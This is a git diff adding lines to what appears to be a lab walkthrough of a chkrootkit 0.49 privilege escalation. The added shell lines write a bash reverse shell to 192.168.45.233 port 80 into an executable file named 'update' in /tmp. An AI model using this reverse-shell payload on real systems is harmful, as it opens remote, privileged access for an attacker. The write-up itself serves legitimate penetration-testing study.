@@ -274,3 +274,8 @@ PSPY
 > searchsploit chrootkit 0.49
 ```
 ![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/5bdcbb6c-24fe-4fd7-832a-beaef284fb6c)
+
+```shell
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ echo '/usr/bin/bash -i >& /dev/tcp/192.168.45.233/80 0>&1' > update
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /usr/bin/chmod +x update 
+```
